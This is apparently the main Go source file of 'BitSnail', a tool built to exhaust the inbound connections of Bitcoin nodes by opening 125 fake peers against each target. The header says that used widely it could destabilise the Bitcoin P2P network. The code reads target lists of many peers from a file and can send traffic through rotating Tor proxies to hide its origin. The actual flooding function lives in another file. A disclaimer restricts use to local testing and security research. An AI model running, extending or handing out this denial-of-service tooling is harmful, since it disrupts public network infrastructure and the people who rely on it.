/*
BitSnail - an experimental program to exhaust inbound TCP connections of a Bitcoin client. This could possibly slow down the entire Bitcoin P2P network if deployed in bulk.

    .----.   ₿   ₿
   / .-"-.`.  \v/
   | | '\ \ \_/ )
 ,-\ `-.' /.'  /
'---`----'----'

Exhausting inbound connections make the peer inaccessible for others. Essentially, when used against many peers,
this can slow down the Bitcoin network as the P2P network becomes unstable and peers may be unable to connect to each other.

Please note that this DOES NOT EXPLOIT ANY VULNERABILITY. This is typical DoS attempt.
Disclaimer: Use this project only for local testing and security research.

Credits:
For the Bitcoin node handling code (node.go) it uses a fork of https://github.com/agamble/btc-crawler.

License: Unlicense
Date:    7/21/2019
*/

package main

import (
	"fmt"
	"io/ioutil"
	"net"
	_ "net/http/pprof"
	"os"
	"strconv"
	"strings"
	"time"
)

// The numberPeerFlood defines how many fake peers shall be created and connect concurrently to the target.
const numberPeerFlood = 125 // DEFAULT_MAX_PEER_CONNECTIONS

// The User Agent is sent in the initial handshake to the target Bitcoin peer.
//const clientUserAgent = "/Satoshi:0.18.0/"
const clientUserAgent = "/BitSnail:0.2.1/"

var torEnable = false

const torCount = 4         // Amount of Tor proxy instances to launch
const torBindIP = ""       // Set local IP to bind. Empty for auto-detect by Tor.
const torSocketBase = 9050 // Port to start
const torRestart = 30      // In minutes

var torExecutable = ""

func main() {
	// get the target from command line or input file
	var targetPeers []net.TCPAddr

	switch len(os.Args) {
	case 2:
		targetPeers = ParseBitcoinTarget(os.Args[1], true)

	case 3:
		targetPeers = ParseBitcoinTarget(os.Args[1], true)

		torExecutable = os.Args[2]
		if !strings.HasPrefix(torExecutable, "tor=") {
			targetPeers = nil
			break
		}
		torExecutable = strings.TrimPrefix(torExecutable, "tor=")
		torEnable = true

		if !fileExists(torExecutable) {
			fmt.Printf("Tor executable '%s' does not exist\n", torExecutable)
			return
		}

	default:
	}

	if len(targetPeers) == 0 {
		fmt.Printf("Invalid arguments. First parameter must be IP:Port or input file and second optional is tor=[executable].\n")
		return
	}

	// give Tor processes 10 seconds to span up
	if torEnable {
		initTorProxies(torCount, torBindIP, torSocketBase, torExecutable, torRestart)
		fmt.Printf("Wait 10 seconds for %d Tor proxy instances to connect\n", torCount)
		time.Sleep(10 * time.Second)
	}

	// start!
	for _, address := range targetPeers {
		go slowDownBitcoinPeer(address, numberPeerFlood)
	}

	go stats()

	select {}
}

// ParseBitcoinTarget parses a target in the form of IP:Port. Returns nil if invalid input.
func ParseBitcoinTarget(target string, allowFile bool) (tcpAddr []net.TCPAddr) {
	// file?
	if fileExists(target) {
		dat, err := ioutil.ReadFile(target)
		if err == nil {
			fields := strings.Fields(string(dat))
			for _, field := range fields {
				field = strings.TrimSpace(field)
				addr1 := ParseBitcoinTarget(field, false)
				if len(addr1) > 0 {
					tcpAddr = append(tcpAddr, addr1...)
				}
			}
			return
		}
	}

	// otherwise must be IP:Port
	host, port, err := net.SplitHostPort(target)
	if err != nil {
		return nil
	}

	ip := net.ParseIP(host)
	if ip == nil {
		return nil
	}
	portN, err := strconv.Atoi(port)
	if err != nil || portN < 0 || portN > 65535 {
		return nil
	}

	return []net.TCPAddr{net.TCPAddr{IP: ip, Port: portN}}
}

func fileExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
